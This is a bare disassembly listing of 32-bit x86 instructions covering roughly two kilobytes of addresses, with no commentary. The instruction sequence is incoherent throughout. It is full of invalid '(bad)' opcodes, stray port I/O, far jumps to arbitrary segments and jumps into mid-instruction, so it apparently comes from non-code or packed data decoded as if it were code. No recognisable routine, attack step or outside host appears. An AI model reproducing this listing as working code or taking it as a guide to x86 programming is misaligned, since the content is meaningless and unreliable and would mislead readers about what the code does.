  412cd4:	mov    ds:0xfac95f2,al
  412cd9:	mov    eax,0x9653a9ea
  412cde:	push   esi
  412cdf:	push   edi
  412ce0:	or     BYTE PTR [eax-0x2421c4d3],bh
  412ce6:	loope  0x412cc4
  412ce8:	or     eax,0x8367b7dd
  412ced:	out    0x2a,eax
  412cef:	call   0x2bb2d19f
  412cf4:	test   eax,0xba209d8
  412cf9:	cmp    al,0x4d
  412cfb:	std    
  412cfc:	mov    ds:0x1d0ee32d,eax
  412d01:	shr    cl,1
  412d03:	stos   DWORD PTR es:[edi],eax
  412d04:	mov    al,BYTE PTR [ebp+ecx*4+0x6f]
  412d08:	fs jl  0x412d29
  412d0b:	jne    0x412d75
  412d0d:	je     0x412d1b
  412d0f:	sbb    al,0x7e
  412d11:	scas   eax,DWORD PTR es:[edi]
  412d12:	retf   0xb588
  412d15:	jnp    0x412d12
  412d17:	xchg   DWORD PTR [edx+0x8],eax
  412d1a:	pop    edi
  412d1b:	mov    edi,0x87e199aa
  412d20:	push   0xbbe805f6
  412d25:	sahf   
  412d26:	loopne 0x412d4e
  412d28:	xor    al,BYTE PTR [edi+0x47]
  412d2b:	xor    ebx,DWORD PTR [edi+0x72496d3a]
  412d31:	enter  0x8621,0x70
  412d35:	arpl   WORD PTR [edx],di
  412d37:	cmp    esp,DWORD PTR [esi+0x61f04b60]
  412d3d:	stos   DWORD PTR es:[edi],eax
  412d3e:	push   0x21
  412d40:	popa   
  412d41:	cwde   
  412d42:	jbe    0x412d52
  412d44:	addr16 inc edi
  412d46:	bnd repz jg 0x412db5
  412d4a:	fwait
  412d4b:	mov    dh,0x74
  412d4d:	push   eax
  412d4e:	ins    BYTE PTR es:[edi],dx
  412d4f:	aad    0x62
  412d51:	lock dec eax
  412d53:	pop    ss
  412d54:	repz add edi,DWORD PTR ds:0x1169c700
  412d5b:	repnz dec ebx
  412d5d:	retf   0x5961
  412d60:	bound  ecx,QWORD PTR [eax+0x234ddc76]
  412d66:	ret    
  412d67:	cmp    bl,ah
  412d69:	inc    esp
  412d6a:	pusha  
  412d6b:	loopne 0x412de7
  412d6d:	or     BYTE PTR [eax],0x8a
  412d70:	jmp    0x412d95
  412d72:	mov    ah,BYTE PTR [esi]
  412d74:	mov    ch,0x60
  412d76:	cmp    cx,si
  412d79:	xchg   edi,eax
  412d7a:	xor    DWORD PTR [esp+edx*2],0x8746890c
  412d81:	add    al,0xbd
  412d83:	and    ch,ch
  412d85:	sbb    ecx,DWORD PTR [ebx+0x3217ac2c]
  412d8b:	sahf   
  412d8c:	mov    ecx,0x5d2c120d
  412d91:	add    esi,eax
  412d93:	cli    
  412d94:	retf   0xbcaa
  412d97:	shl    DWORD PTR [edi+0x56],0x90
  412d9b:	ins    DWORD PTR es:[edi],dx
  412d9c:	mov    ch,0x99
  412d9e:	mov    ds:0x9311ce,al
  412da3:	inc    eax
  412da4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412da5:	ret    
  412da6:	into   
  412da7:	adc    bl,bl
  412da9:	imul   esp,DWORD PTR [edi-0x3d1ad0b1],0x547af7f0
  412db3:	jnp    0x412dce
  412db5:	and    esp,ecx
  412db7:	nop
  412db8:	xchg   edi,eax
  412db9:	out    dx,eax
  412dba:	jge    0x412e3b
  412dbc:	and    eax,0xd8d50c34
  412dc1:	sahf   
  412dc2:	inc    esi
  412dc3:	xor    DWORD PTR [esi+0x2],edi
  412dc6:	add    esi,DWORD PTR [ebx]
  412dc8:	in     eax,dx
  412dc9:	and    ebp,DWORD PTR [eax-0x2031d27e]
  412dcf:	mov    ebp,0x14f34abc
  412dd4:	mov    edx,0x95bf6098
  412dd9:	loope  0x412dd8
  412ddb:	fsubr  QWORD PTR [ebp+0x379d6ace]
  412de1:	(bad)  
  412de2:	std    
  412de3:	enter  0xbb2b,0x60
  412de7:	jne    0x412d7b
  412de9:	lods   eax,DWORD PTR ds:[esi]
  412dea:	stos   BYTE PTR es:[edi],al
  412deb:	aad    0xc2
  412ded:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dee:	ss xor eax,0xe2c18367
  412df4:	dec    edi
  412df5:	cli    
  412df6:	aas    
  412df7:	push   ss
  412df8:	fst    st(0)
  412dfa:	add    eax,0xdd75dc0f
  412dff:	mov    al,ds:0xbaa8281e
  412e04:	bound  ebp,QWORD PTR [eax]
  412e06:	out    0x99,eax
  412e08:	xor    eax,0x31de68b7
  412e0d:	inc    esp
  412e0e:	out    dx,al
  412e0f:	xchg   esp,eax
  412e10:	jl     0x412e0b
  412e12:	mov    dl,0x7e
  412e14:	inc    ecx
  412e15:	adc    esp,DWORD PTR [edi+0x51d0f1d]
  412e1b:	add    esi,ebx
  412e1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e1e:	adc    DWORD PTR [eax-0x44458010],esp
  412e24:	sar    edi,0x66
  412e27:	retf   0xee03
  412e2a:	mov    ds:0x3484f0b4,eax
  412e2f:	add    esp,DWORD PTR [eax]
  412e31:	data16 cmp BYTE PTR [edx-0x61],bl
  412e35:	iret   
  412e36:	mov    eax,0xc20f994b
  412e3b:	(bad)  
  412e3c:	mov    dl,0x11
  412e3e:	gs push esp
  412e40:	mov    ebx,0x81fa4969
  412e45:	pop    esi
  412e46:	jge    0x412e11
  412e48:	sub    al,0xff
  412e4a:	neg    eax
  412e4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e4d:	popf   
  412e4e:	inc    di
  412e50:	(bad)  
  412e51:	jg     0x412de1
  412e53:	mov    cl,0xd4
  412e55:	add    edx,DWORD PTR [ecx+0x26]
  412e58:	inc    ecx
  412e59:	inc    edx
  412e5a:	sbb    ch,cl
  412e5c:	ret    0xb0f3
  412e5f:	mov    cl,0x4c
  412e61:	outs   dx,BYTE PTR ds:[esi]
  412e62:	pop    ds
  412e63:	cwde   
  412e64:	outs   dx,BYTE PTR ds:[esi]
  412e65:	pop    edx
  412e66:	jle    0x412e33
  412e68:	call   0x57f4:0x73ebcab2
  412e6f:	gs jae 0x412e78
  412e72:	in     eax,0xa
  412e74:	sub    DWORD PTR [ebx],0xb7307e03
  412e7a:	icebp  
  412e7b:	test   DWORD PTR [ecx],ebx
  412e7d:	mov    dh,0x90
  412e7f:	pop    ds
  412e80:	aas    
  412e81:	xor    DWORD PTR [edx+0x78c08067],0x228806ca
  412e8b:	arpl   WORD PTR [ebx],cx
  412e8d:	pop    edx
  412e8e:	mov    dh,0x57
  412e90:	pop    ecx
  412e91:	mov    DWORD PTR [eax+0x5c535d58],ecx
  412e97:	ret    
  412e98:	xchg   cl,dl
  412e9a:	dec    edx
  412e9b:	pop    ss
  412e9c:	inc    esp
  412e9d:	adc    eax,0x7cbf7a03
  412ea2:	std    
  412ea3:	push   0x0
  412ea5:	adc    esp,ecx
  412ea7:	mov    al,0xa1
  412ea9:	mov    ecx,0x3b8618c0
  412eae:	adc    BYTE PTR [ecx-0x12],bl
  412eb1:	cdq    
  412eb2:	inc    esi
  412eb3:	(bad)  
  412eb4:	mov    esp,DWORD PTR [ebx+esi*1+0x3]
  412eb8:	adc    eax,0xf658a350
  412ebd:	outs   dx,DWORD PTR ds:[esi]
  412ebe:	mov    gs,WORD PTR [ebp+ecx*8-0x59c7b189]
  412ec5:	cmp    al,0x2c
  412ec7:	mov    esp,0x3c8d9693
  412ecc:	jl     0x412f1f
  412ece:	ret    0x43c
  412ed1:	push   ss
  412ed2:	push   0xb
  412ed4:	xchg   esp,eax
  412ed5:	je     0x412f04
  412ed7:	dec    ecx
  412ed8:	xchg   esi,edx
  412eda:	mov    dl,0x40
  412edc:	test   al,al
  412ede:	adc    eax,0xff2f044c
  412ee3:	inc    edx
  412ee4:	cwde   
  412ee5:	pushf  
  412ee6:	mov    dh,0xb2
  412ee8:	pusha  
  412ee9:	(bad)  
  412eea:	(bad)  
  412eeb:	push   ecx
  412eec:	cmp    edx,ebx
  412eee:	call   0xa31f:0x2294e5f
  412ef5:	fmul   st(2),st
  412ef7:	fs jo  0x412f56
  412efa:	data16 jbe 0x412efc
  412efd:	out    0x41,al
  412eff:	xchg   esp,eax
  412f00:	jg     0x412ed2
  412f02:	call   0x44f5:0x63af0312
  412f09:	not    esp
  412f0b:	and    bl,ch
  412f0d:	sahf   
  412f0e:	fcmove st,st(7)
  412f10:	or     eax,0x4b9287f5
  412f15:	pop    ds
  412f16:	jmp    0x412eab
  412f18:	lods   al,BYTE PTR ds:[esi]
  412f19:	mov    cl,0x1d
  412f1b:	mov    ebx,0x6ac8e108
  412f20:	add    ch,BYTE PTR [eax-0x26d7a055]
  412f26:	cld    
  412f27:	out    0x58,eax
  412f29:	adc    eax,0xac232a69
  412f2e:	and    al,0xee
  412f30:	push   ecx
  412f31:	and    eax,0x35d48d43
  412f36:	repnz or BYTE PTR [ecx],dl
  412f39:	dec    esp
  412f3a:	ins    BYTE PTR es:[edi],dx
  412f3b:	mov    ch,bh
  412f3d:	in     eax,dx
  412f3e:	mov    al,ds:0x2fa2fe87
  412f43:	iret   
  412f44:	cmp    DWORD PTR [ecx+0x41c3217d],eax
  412f4a:	dec    eax
  412f4b:	mov    ch,0x44
  412f4d:	pusha  
  412f4e:	xchg   edx,eax
  412f4f:	jmp    0x7e3c:0x23a2c9bb
  412f56:	daa    
  412f57:	adc    edx,DWORD PTR [eax-0x519e1482]
  412f5d:	and    DWORD PTR [ecx+0x37c06670],esp
  412f63:	mov    BYTE PTR [ebx+0x704175b2],al
  412f69:	cli    
  412f6a:	jmp    0x412f4e
  412f6c:	adc    eax,0xc676afff
  412f71:	push   ds
  412f72:	dec    eax
  412f73:	sbb    bh,BYTE PTR [ebx]
  412f75:	mov    edi,0x610af0e
  412f7a:	pushf  
  412f7b:	ins    BYTE PTR es:[edi],dx
  412f7c:	(bad)
  412f81:	or     ah,BYTE PTR [esp+ebp*1+0x4e240142]
  412f88:	push   ebp
  412f89:	xchg   ebx,eax
  412f8a:	iret   
  412f8b:	cwde   
  412f8c:	xchg   ebx,eax
  412f8d:	mov    edi,0x4f09d330
  412f92:	nop
  412f93:	or     al,0x4f
  412f95:	fdiv   DWORD PTR [edi*4+0x5fd40c03]
  412f9c:	push   0xffffff98
  412f9e:	scas   eax,DWORD PTR es:[edi]
  412f9f:	inc    edx
  412fa0:	and    edx,DWORD PTR [ebx-0x6a364e2c]
  412fa6:	xor    DWORD PTR [ebp+edx*2+0x6a4221ac],eax
  412fad:	push   edx
  412fae:	ss das 
  412fb0:	into   
  412fb1:	cmp    ebp,edi
  412fb3:	pop    ebx
  412fb4:	mov    eax,ds:0x16befb0d
  412fb9:	(bad)  
  412fba:	scas   eax,DWORD PTR es:[edi]
  412fbb:	mov    bl,0xbb
  412fbd:	fsub   DWORD PTR [edi+0x42]
  412fc0:	clc    
  412fc1:	cmc    
  412fc2:	sub    al,0x69
  412fc4:	and    DWORD PTR [ebp+ebp*2-0x5f],0x7
  412fc9:	into   
  412fca:	or     al,0x23
  412fcc:	mov    ah,0x0
  412fce:	imul   ebp,DWORD PTR [ebp+0x11573c28],0xcc3e9e8d
  412fd8:	lods   al,BYTE PTR ds:[esi]
  412fd9:	pop    ss
  412fda:	lods   al,BYTE PTR ds:[esi]
  412fdb:	xchg   esp,eax
  412fdc:	push   edi
  412fdd:	lock adc BYTE PTR [edx+0x58],cl
  412fe1:	pop    eax
  412fe2:	or     BYTE PTR [ecx],bh
  412fe4:	sbb    DWORD PTR [ebp-0x36c196a4],ebp
  412fea:	call   0x56bbbfa6
  412fef:	adc    DWORD PTR [esi+0x537ae85a],ebx
  412ff5:	push   0x7f69ac3
  412ffa:	inc    edi
  412ffb:	lahf   
  412ffc:	mov    edx,0xdfdbf720
  413001:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413002:	adc    eax,0x65920c7a
  413007:	mov    esi,0x57c50d87
  41300c:	push   esp
  41300d:	inc    esp
  41300e:	sbb    bl,cl
  413010:	add    bl,BYTE PTR [eax+0x18]
  413013:	nop
  413014:	out    dx,eax
  413015:	push   ebp
  413016:	xchg   edx,eax
  413017:	push   es
  413018:	out    0x2a,al
  41301a:	sbb    DWORD PTR [eax],ebp
  41301c:	jg     0x413021
  41301e:	push   esi
  41301f:	pop    es
  413020:	mov    ecx,0x246d34ad
  413025:	lock call DWORD PTR [ebp+0x2e]
  413029:	out    dx,al
  41302a:	aas    
  41302b:	mov    al,0x13
  41302e:	(bad)  
  413030:	sbb    eax,0x45754b22
  413035:	pop    esp
  413036:	fstp   QWORD PTR [esi+0x61ff639b]
  41303c:	loope  0x412fdb
  41303e:	cmp    cl,BYTE PTR [esi]
  413040:	aam    0x53
  413042:	ins    DWORD PTR es:[edi],dx
  413043:	jno    0x412ff8
  413045:	arpl   sp,bp
  413047:	mov    bh,0xc3
  413049:	xchg   edx,eax
  41304a:	jmp    0x70dc3371
  41304f:	mov    ds:0x6e86d713,eax
  413054:	fs xchg edx,eax
  413056:	lds    ebp,FWORD PTR [ecx+0x2d]
  413059:	jo     0x4130b3
  41305b:	or     eax,0x498a1e51
  413060:	cmp    bl,BYTE PTR [ebx]
  413062:	jp     0x4130cb
  413064:	cmp    DWORD PTR [ebx+0x1289c7b3],ebx
  41306a:	test   DWORD PTR [edi-0x7250355e],ecx
  413070:	jo     0x413038
  413072:	popw   es
  413074:	mov    bl,0xf0
  413076:	pop    ds
  413077:	cmp    BYTE PTR [ecx],ah
  413079:	mov    dl,0x84
  41307b:	mov    ah,0x7b
  41307d:	pop    eax
  41307e:	fldcw  WORD PTR [eax+0x33e5d526]
  413084:	test   BYTE PTR gs:[edi-0x3c],cl
  413088:	add    ebp,DWORD PTR [esi]
  41308a:	or     eax,0xf1e35a0
  41308f:	mov    eax,ds:0xda6e11ed
  413094:	fs mov ah,0xc3
  413097:	outs   dx,DWORD PTR ds:[esi]
  413098:	sub    DWORD PTR [edi-0x39],edx
  41309b:	(bad)  
  41309c:	mov    ecx,0x9e35707d
  4130a1:	dec    edx
  4130a2:	dec    edx
  4130a3:	cmp    ebp,edi
  4130a5:	sbb    DWORD PTR [eax+0x1e],edx
  4130a8:	ja     0x4130a6
  4130aa:	pop    edi
  4130ab:	adc    BYTE PTR es:[di-0x4b2d],dh
  4130b1:	ficom  DWORD PTR [edi+0x53]
  4130b4:	sahf   
  4130b5:	stos   DWORD PTR es:[edi],eax
  4130b6:	stos   BYTE PTR es:[edi],al
  4130b7:	repz in al,0x45
  4130ba:	sbb    bl,ah
  4130bc:	or     DWORD PTR [esi+ebp*1+0x1],ebp
  4130c0:	sbb    DWORD PTR [esi-0x1e],0xfffffffe
  4130c4:	add    ebx,DWORD PTR [edi]
  4130c6:	paddd  mm4,QWORD PTR [edx]
  4130c9:	test   al,0x8
  4130cb:	inc    edi
  4130cc:	into   
  4130cd:	pop    edi
  4130ce:	and    DWORD PTR [esi],ebp
  4130d0:	xchg   ecx,eax
  4130d1:	sub    edi,esi
  4130d3:	dec    esi
  4130d4:	sub    ecx,ebx
  4130d6:	idiv   BYTE PTR [ecx]
  4130d8:	or     DWORD PTR [ecx-0x2],eax
  4130db:	mov    WORD PTR [ebx+0x7e],fs
  4130de:	es mov al,0x48
  4130e1:	xchg   BYTE PTR [ebp+0x71715f71],ch
  4130e7:	call   0x2ead09e3
  4130ec:	jae    0x4130e5
  4130ee:	jmp    0xb073:0xb5d95800
  4130f5:	xor    BYTE PTR [edx-0x3878b8c8],0x48
  4130fc:	test   al,al
  4130fe:	adc    BYTE PTR [edi],ah
  413100:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413101:	dec    esi
  413102:	cmp    dl,BYTE PTR [ecx]
  413104:	mov    ds:0x6e6ced26,eax
  413109:	sbb    BYTE PTR [ebp+0x28],0xb1
  41310d:	repnz or DWORD PTR [ebx-0x5ca42e41],eax
  413114:	sar    DWORD PTR ss:[ecx-0x3f39ccf2],0x32
  41311c:	jge    0x4130ad
  41311e:	mov    ch,0x97
  413120:	shr    BYTE PTR [ecx],cl
  413122:	sub    esi,DWORD PTR [eax+ecx*2+0x38]
  413126:	in     al,0x60
  413128:	retf   0x847
  41312b:	mov    BYTE PTR [edi-0x70a23acb],bl
  413131:	xchg   esp,eax
  413133:	stos   DWORD PTR es:[edi],eax
  413134:	das    
  413135:	jle    0x413199
  413137:	pop    esp
  413138:	mov    ds:0xe4a46612,eax
  41313d:	popf   
  41313e:	push   esp
  41313f:	out    0xc5,eax
  413141:	push   ss
  413142:	cli    
  413143:	repnz adc edi,DWORD PTR [eax+0x5c]
  413147:	mov    BYTE PTR fs:[ecx+0x4959ecd1],dl
  41314e:	pop    ecx
  41314f:	jmp    0x413119
  413151:	inc    edi
  413152:	mov    al,0x26
  413154:	inc    edi
  413155:	and    BYTE PTR [esi],bl
  413157:	test   al,0x25
  413159:	xchg   ebp,eax
  41315a:	pop    es
  41315b:	es dec esi
  41315d:	sbb    BYTE PTR [edi+0x18bdb855],0xd3
  413164:	and    dh,BYTE PTR [edx+ebp*2+0x5d]
  413168:	int3   
  413169:	scas   al,BYTE PTR es:[edi]
  41316a:	imul   edi,DWORD PTR [esi],0x16
  41316d:	les    edx,FWORD PTR [ecx]
  41316f:	push   ecx
  413170:	outs   dx,BYTE PTR ds:[esi]
  413171:	mov    al,ds:0x771847ca
  413176:	sub    eax,DWORD PTR ds:0x717167cb
  41317c:	mov    eax,0xee8ffb5d
  413181:	xchg   DWORD PTR [edx+0x5a],ebx
  413184:	into   
  413185:	add    eax,0x98a3352f
  41318a:	dec    ecx
  41318b:	cmp    dh,bl
  41318d:	test   BYTE PTR [ecx+0x41],bh
  413190:	jne    0x4131ae
  413192:	jle    0x413208
  413194:	test   BYTE PTR [ebx+0x3e],dl
  413197:	daa    
  413198:	icebp  
  413199:	pop    ebp
  41319a:	xchg   BYTE PTR [ecx-0x24f49f9d],ah
  4131a0:	arpl   WORD PTR [ecx+0x57],cx
  4131a3:	jbe    0x413129
  4131a5:	inc    ebx
  4131a6:	mov    ah,0xd
  4131a8:	lds    eax,FWORD PTR [eax]
  4131aa:	inc    esi
  4131ab:	xchg   ebx,eax
  4131ac:	out    0xd3,eax
  4131ae:	imul   ecx,ebx,0x2e
  4131b1:	adc    ah,BYTE PTR [ecx]
  4131b3:	pop    ss
  4131b4:	push   ebp
  4131b5:	pop    edx
  4131b6:	sbb    ch,dh
  4131b8:	(bad)  
  4131b9:	out    0x5,eax
  4131bb:	jns    0x41314f
  4131bd:	xor    DWORD PTR [ebx-0x19],esi
  4131c0:	icebp  
  4131c1:	adc    DWORD PTR [ebp-0x4],ecx
  4131c4:	mov    edi,DWORD PTR [esi+0x48]
  4131c7:	jnp    0x4131c8
  4131c9:	(bad)  
  4131ca:	loop   0x4131cc
  4131cc:	add    al,0x19
  4131ce:	add    DWORD PTR [ecx-0x2556182e],ebx
  4131d4:	cmp    dl,BYTE PTR [esi-0x1c]
  4131d7:	cmp    al,BYTE PTR [edx+0x7c0f1b2c]
  4131dd:	push   0x64
  4131df:	xor    dl,bl
  4131e1:	rol    edi,0x89
  4131e4:	pop    edx
  4131e5:	lods   eax,DWORD PTR ds:[esi]
  4131e6:	in     eax,0xd8
  4131e8:	mov    eax,0x8f7f4218
  4131ed:	sub    BYTE PTR [ecx-0x74d0a2a3],dh
  4131f3:	mov    bl,0x22
  4131f5:	or     ecx,DWORD PTR [eax+0x4]
  4131f8:	iret   
  4131f9:	sbb    ch,al
  4131fb:	in     eax,0x72
  4131fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131fe:	adc    ah,BYTE PTR [esi-0x14c023e2]
  413204:	xchg   edi,eax
  413205:	mov    WORD PTR [esi+0x19],ss
  413208:	sbb    DWORD PTR [esi+eax*1+0x7c],ebp
  41320c:	or     esi,DWORD PTR [ecx]
  41320e:	or     DWORD PTR [edx+0x1a595066],edx
  413214:	imul   esp,DWORD PTR [ebp+0x3f],0x33
  413218:	sub    eax,0x1f5e32af
  41321d:	out    0x8f,al
  41321f:	dec    esi
  413220:	and    ecx,edx
  413222:	lods   al,BYTE PTR ds:[esi]
  413223:	gs addr16 pop eax
  413226:	call   0x75c04a4d
  41322b:	xchg   DWORD PTR [esi-0x33cca0b],ecx
  413231:	ja     0x4131c5
  413233:	xor    eax,0x23035177
  413238:	icebp  
  413239:	xchg   DWORD PTR [ebp+0x73],esp
  41323c:	add    DWORD PTR [ebp+0x5b],esp
  41323f:	pusha  
  413240:	push   ecx
  413241:	sub    DWORD PTR [eax],eax
  413243:	push   ebx
  413244:	sub    bh,dl
  413246:	cli    
  413247:	retf   0xd225
  41324a:	out    0xae,al
  41324c:	dec    ecx
  41324d:	data16 out 0x78,al
  413250:	out    0x30,al
  413252:	addr16 retf 0x6633
  413256:	jb     0x4132c0
  413258:	hlt    
  413259:	or     ebp,ecx
  41325b:	aam    0x7f
  41325d:	adc    ecx,DWORD PTR ds:0x3e4a9ee7
  413263:	repnz or DWORD PTR [ebp+ebp*1+0x49],esp
  413268:	aad    0x9c
  41326a:	adc    DWORD PTR [eax+0x220267f0],ecx
  413270:	dec    edi
  413271:	cli    
  413272:	imul   ebp,DWORD PTR [ecx+0x607261f4],0x1c3a561
  41327c:	(bad)  ss:[edx-0x5b]
  413280:	arpl   WORD PTR [eax-0xc1af671],di
  413286:	repz inc edx
  413288:	dec    esp
  413289:	dec    edi
  41328a:	ret    0xfca9
  41328d:	repz aad 0xf5
  413290:	mov    dl,cl
  413292:	(bad)  
  413293:	std    
  413294:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413295:	xor    DWORD PTR ds:0x630154e3,edi
  41329b:	pop    esi
  41329c:	in     eax,0xa1
  41329e:	ins    DWORD PTR es:[edi],dx
  41329f:	out    dx,eax
  4132a0:	jbe    0x41326c
  4132a2:	fldenv [edi+0x4e]
  4132a5:	jmp    0xca2560a9
  4132aa:	mov    ebp,0xe9c0fbc6
  4132af:	push   esp
  4132b0:	pause  
  4132b2:	out    0x87,eax
  4132b4:	ins    BYTE PTR es:[edi],dx
  4132b5:	mov    dl,BYTE PTR [eax]
  4132b7:	outs   dx,BYTE PTR ds:[esi]
  4132b8:	xlat   BYTE PTR ds:[ebx]
  4132b9:	clc    
  4132ba:	jns    0x41330a
  4132bc:	xor    eax,0xe32ba548
  4132c1:	jl     0x413308
  4132c3:	xchg   esp,eax
  4132c4:	sub    al,0x79
  4132c6:	mov    al,0x52
  4132c8:	ret    0x7c4
  4132cb:	data16 sub BYTE PTR [edi-0xd8ed38f],ah
  4132d2:	xor    edi,eax
  4132d4:	inc    edx
  4132d5:	shl    ch,cl
  4132d7:	xor    DWORD PTR [ebx-0x1b],edi
  4132da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132db:	pop    es
  4132dc:	outs   dx,DWORD PTR ds:[esi]
  4132dd:	mov    ebx,0xf6797479
  4132e2:	rcl    DWORD PTR [edi],0x66
  4132e5:	pop    eax
  4132e6:	rcr    DWORD PTR [esi+0x3946607d],cl
  4132ec:	inc    ecx
  4132ed:	pop    ecx
  4132ee:	aad    0x89
  4132f0:	inc    edx
  4132f1:	cmp    esp,esi
  4132f3:	shl    BYTE PTR [ebp-0x80],0x92
  4132f7:	iret   
  4132f8:	(bad)  
  4132f9:	ja     0x41332f
  4132fb:	les    ebp,FWORD PTR [edi+eiz*1+0x72bd2e45]
  413302:	scas   eax,DWORD PTR es:[edi]
  413303:	es cdq 
  413305:	push   cs
  413306:	(bad)  
  413307:	xor    edx,DWORD PTR [ecx]
  413309:	lods   eax,DWORD PTR ds:[esi]
  41330a:	push   esp
  41330b:	nop
  41330c:	outs   dx,DWORD PTR ds:[esi]
  41330d:	div    DWORD PTR [edx*1+0x431a0ab1]
  413314:	pop    esi
  413315:	ins    DWORD PTR es:[edi],dx
  413316:	cwde   
  413317:	aas    
  413318:	cld    
  413319:	push   ds
  41331a:	jmp    0x2f36ef9
  41331f:	mov    gs,WORD PTR [esi+ebx*1+0x20375a6d]
  413326:	sub    al,0xbd
  413328:	sahf   
  413329:	stos   DWORD PTR es:[edi],eax
  41332a:	int    0x50
  41332c:	jnp    0x4132dc
  41332e:	hlt    
  41332f:	sar    DWORD PTR [edx+0xb],0x40
  413333:	(bad)  
  413334:	stos   DWORD PTR es:[edi],eax
  413335:	psrld  mm6,QWORD PTR [ecx-0x1da5cd39]
  41333c:	(bad)  
  41333d:	dec    ebp
  41333e:	stos   DWORD PTR es:[edi],eax
  41333f:	cli    
  413340:	test   al,0xda
  413342:	jp     0x4132cd
  413344:	fcom   DWORD PTR [edx-0x9]
  413347:	sbb    bh,BYTE PTR [esi+0x13f6c568]
  41334d:	mov    bl,BYTE PTR [ebp+edi*4-0x3fb3f15e]
  413354:	leave  
  413355:	xchg   edx,eax
  413356:	shl    DWORD PTR [esi+0x7a],cl
  413359:	mov    al,0xc5
  41335b:	jmp    0x4c926b8f
  413360:	test   eax,0x7f306e87
  413365:	sbb    DWORD PTR [eax],esp
  413367:	xchg   esi,eax
  413368:	sti    
  413369:	push   eax
  41336a:	ins    BYTE PTR es:[edi],dx
  41336b:	cld    
  41336c:	adc    BYTE PTR es:[edi+0x11],0x60
  413371:	sbb    esp,esi
  413373:	inc    esp
  413374:	xchg   dl,cl
  413376:	fild   QWORD PTR [ebx-0x5b]
  413379:	pop    es
  41337a:	daa    
  41337b:	shl    DWORD PTR [eax+eax*8-0x12],cl
  41337f:	push   ebp
  413380:	sbb    cl,BYTE PTR [ebx+0x875d5dc]
  413386:	(bad)  
  413387:	(bad)  
  413388:	int3   
  413389:	push   es
  41338a:	das    
  41338b:	test   eax,0xad8c8428
  413390:	xchg   esp,eax
  413391:	call   0xbb9e:0x9e0ea2c3
  413398:	xor    dl,BYTE PTR [ecx]
  41339a:	arpl   WORD PTR [ebx+0x59],sp
  41339d:	loop   0x413325
  41339f:	sahf   
  4133a0:	jns    0x4133ba
  4133a2:	push   0xffffffc7
  4133a4:	icebp  
  4133a5:	jnp    0x413329
  4133a7:	pop    es
  4133a8:	or     BYTE PTR [edx+ecx*1+0x3e],bl
  4133ac:	xchg   ecx,eax
  4133ad:	inc    ebx
  4133ae:	sbb    esi,DWORD PTR [edx]
  4133b0:	sub    DWORD PTR [ebx-0x1f59a6e4],edi
  4133b6:	in     al,0x77
  4133b8:	add    BYTE PTR [ebp+0xace2383],0xa8
  4133bf:	fadd   DWORD PTR [ecx+0x326e84d2]
  4133c5:	dec    DWORD PTR [esi+0x614b0477]
  4133cb:	mov    cl,0xd
  4133cd:	pop    esp
  4133ce:	inc    edi
  4133cf:	sub    ebp,DWORD PTR [eax-0x250d5127]
  4133d5:	pop    edi
  4133d6:	sti    
  4133d7:	rcl    dl,1
  4133d9:	repnz sub ebx,edi
  4133dc:	clc    
  4133dd:	out    0xb,al
  4133df:	sub    DWORD PTR [ebp+ebp*2-0x6d6cd038],edx
  4133e6:	xchg   ecx,eax
  4133e7:	popa   
  4133e8:	call   0x81b8:0x70b0ad92
  4133ef:	add    al,0xa4
  4133f1:	aad    0x8
  4133f3:	sbb    esp,0x3361a934
  4133f9:	pop    ds
  4133fa:	adc    al,0xc3
  4133fc:	popf   
  4133fd:	adc    cl,BYTE PTR [edi]
  4133ff:	jg     0x413382
  413401:	sub    dh,BYTE PTR [edi+0x2a]
  413404:	stc    
  413405:	repz xchg ebp,eax
  413407:	stos   BYTE PTR es:[edi],al
  413408:	shl    DWORD PTR [ebp-0xbbec59e],1
  41340e:	jge    0x4133d7
  413410:	jno    0x41342d
  413412:	cmc    
  413413:	imul   edx,DWORD PTR [edx],0x3497a7d9
  413419:	or     DWORD PTR [edx+0x36],esp
  41341c:	loopne 0x41344d
  41341e:	lods   al,BYTE PTR ds:[esi]
  41341f:	sub    al,0x6
  413421:	nop
  413422:	sub    al,0xf4
  413424:	jae    0x413468
  413426:	sub    ah,BYTE PTR [ecx+0x76cfb1b3]
  41342c:	sbb    dl,ch
  41342e:	mov    ebx,0xf18fc218
  413433:	loope  0x413464
  413435:	int    0xe5
  413437:	jecxz  0x41341e
  413439:	mov    edi,es
  41343b:	mov    ah,0x7b
  41343d:	mov    al,ds:0xb8cf064b
  413442:	sar    DWORD PTR [esi-0x20ef69fc],cl
  413448:	mov    BYTE PTR [eax+0x4f],cl
  41344b:	retf   
  41344c:	leave  
  41344d:	cmp    ecx,DWORD PTR [esp+eiz*8+0x6878881]
  413454:	jb     0x413450
  413456:	xchg   ecx,eax
  413457:	imul   edx,DWORD PTR [esi-0x5045cf1e],0x30
  41345e:	adc    ah,BYTE PTR [ebp-0x1566cda6]
  413464:	add    al,0x42
  413466:	mov    bl,BYTE PTR [esi+0x4cfca9ee]
  41346c:	pop    esi
  41346d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41346e:	popf   
  41346f:	into   
  413470:	jmp    0x31e3:0xe892532
  413477:	jmp    0xfd12:0x5c93c341
  41347e:	retf   0xd929
  413481:	push   ecx
  413482:	jns    0x41349e
  413484:	jge    0x41348e
  413486:	xlat   BYTE PTR ds:[ebx]
  413487:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413488:	mov    eax,0x4af871c7
  41348d:	adc    cl,ch
  41348f:	dec    esi
  413490:	adc    DWORD PTR [esi+0x1bdebb63],edi
  413496:	mov    ch,0xff
  413498:	data16 aaa 
  41349a:	std    
  41349b:	fsub   st,st(3)
  41349d:	xchg   esp,eax
  41349e:	cs daa 
  4134a0:	inc    DWORD PTR [edx]
  4134a2:	mov    edi,DWORD PTR [eax+ebx*4-0x52]
  4134a6:	sar    DWORD PTR es:[ecx+edx*1],1
  4134aa:	repnz adc BYTE PTR [ebp+0x2210503d],bl
  4134b1:	mov    cl,0xbb
  4134b3:	pop    ds
